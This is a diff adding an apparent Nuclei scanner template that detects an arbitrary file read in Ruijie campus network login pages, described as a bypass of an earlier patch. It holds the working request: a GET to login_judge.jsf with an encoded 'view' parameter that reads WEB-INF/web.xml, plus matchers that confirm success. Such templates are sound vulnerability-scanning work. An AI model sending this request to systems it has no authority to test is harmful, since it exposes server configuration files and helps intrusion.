@@ -1,0 +1,23 @@
+id: ruijie-campus-network-login-judge-jsf-anyfile-read-patch-bypass
+info:
+  name: Ruijie Campus Network Login Judge JSF Arbitrary File Read (Patch Bypass)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/selfservice/selfservice/module/scgroup/web/login_judge.jsf?vie%77=./WEB-INF/web.xml%3F"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "WEB-INF\\config\\property\\system.properties"
+          - "<param-name>"
+      - type: word
+        words:
+          - "access Forbidden!"
+        negative: true
